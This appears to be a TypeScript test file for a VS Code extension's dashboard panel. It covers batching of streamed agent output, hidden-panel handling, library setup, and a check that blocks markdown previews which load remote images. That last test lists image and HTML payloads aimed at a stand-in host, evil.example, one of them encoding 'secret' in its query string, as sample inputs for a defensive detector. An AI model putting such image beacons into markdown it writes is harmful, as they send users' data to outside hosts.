// What the dashboard panel posts of an agent's streamed output: in batches, and nothing half a sentence long.
import test from 'node:test';
import * as assert from 'node:assert/strict';
import Module from 'module';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import type { HostMessage } from '../src/core/wire';

// panel.ts loads `vscode`: the dialogs a test answers, nothing else.
/* eslint-disable @typescript-eslint/no-require-imports */
const vscodeStub = { window: {} as Record<string, unknown>, Uri: { file: (fsPath: string) => ({ fsPath }) } };
const loader = Module as unknown as { _load: (request: string, ...rest: unknown[]) => unknown };
const load = loader._load;
loader._load = function (this: unknown, request: string, ...rest: unknown[]) {
  return request === 'vscode' ? vscodeStub : load.call(this, request, ...rest);
};
const { DashboardPanel } = require('../src/panel') as typeof import('../src/panel');
loader._load = load;

/** A panel without a webview: what it posts, and whether it is in view. */
function panel() {
  const posted: HostMessage[] = [];
  const view = { visible: true };
  const p = Object.assign(Object.create(DashboardPanel.prototype) as InstanceType<typeof DashboardPanel>, {
    panel: view,
    outputQueue: [],
    outputTimer: undefined,
    missedText: new Set<string>(),
    post: (m: HostMessage) => (posted.push(m), Promise.resolve(true)),
  });
  return { p, posted, view };
}

const delta = (key: string, text: string) => ({ type: 'output' as const, taskId: 'T', key, item: { type: 'text_delta' as const, text } });
const flushed = () => new Promise((r) => setTimeout(r, 80));

test('panel: streamed text goes in one message per batch, merged, in order with the rest', async () => {
  const { p, posted } = panel();
  for (const piece of ['Reading ', 'the ', 'plan']) p.queueOutput(delta('a', piece));
  p.queueOutput({ type: 'output', taskId: 'T', key: 'a', item: { type: 'tool_use', id: '1', name: 'Read', input: {} } });
  assert.equal(posted.length, 0, 'nothing goes before the batch is due');
  await flushed();
  assert.deepEqual(posted.map((m) => (m.type === 'output' ? [m.item.type, 'text' in m.item ? m.item.text : ''] : m.type)), [['text_delta', 'Reading the plan'], ['tool_use', '']]);
});

test('panel: a hidden panel gets no text pieces, and none of that message after it shows again until the whole text', async () => {
  const { p, posted, view } = panel();
  view.visible = false;
  p.queueOutput(delta('a', 'Half a '));
  view.visible = true;
  p.queueOutput(delta('a', 'sentence'));
  p.queueOutput(delta('b', 'Another step'));
  p.queueOutput({ type: 'output', taskId: 'T', key: 'a', item: { type: 'text', text: 'Half a sentence.' } });
  p.queueOutput(delta('a', 'Next '));
  await flushed();
  assert.deepEqual(posted.map((m) => (m.type === 'output' && 'text' in m.item ? [m.key, m.item.type, m.item.text] : null)), [['b', 'text_delta', 'Another step'], ['a', 'text', 'Half a sentence.'], ['a', 'text_delta', 'Next ']]);
});

test('panel: a folder without library.yaml becomes a library once you say so', async () => {
  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-lib-ws-')));
  fs.mkdirSync(path.join(ws, '.claudestrator'));
  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'language: English\n');
  const lib = path.join(ws, 'agents-lib');
  fs.mkdirSync(lib);
  // The folder picked, "Start a library", then "This project".
  vscodeStub.window.showOpenDialog = async () => [{ fsPath: lib }];
  vscodeStub.window.showInformationMessage = async (_m: string, _o: unknown, ...items: string[]) => items[items.length - 1];
  const p = Object.assign(Object.create(DashboardPanel.prototype) as InstanceType<typeof DashboardPanel>, { orch: { root: ws } });
  const r = await p.$addLibrary();
  assert.ok(r.added, JSON.stringify(r));
  assert.ok(fs.existsSync(path.join(lib, 'library.yaml')), 'library.yaml is written');
  assert.match(fs.readFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'utf8'), /libraries:\n\s+- \.\.\/agents-lib/);
});

test('panel: a report that would load images from the web is opened as text, not in the preview', async () => {
  const { loadsRemote } = await import('../src/core/view');
  for (const md of ['![x](https://evil.example/?q=c2VjcmV0)', '![](//evil.example/a.png)', '<img src="https://evil.example/p">', '<img alt=x src=http://evil.example/p>', '![logo][l]\n\n[l]: https://evil.example/l.png', '<video poster="https://evil.example/p">']) {
    assert.equal(loadsRemote(md), true, md);
  }
  for (const md of ['# Plan\n\n[docs](https://docs.acme.com) and https://example.com', '![diagram](./diagram.png)', '[l]: https://example.com with no image']) {
    assert.equal(loadsRemote(md), false, md);
  }
});
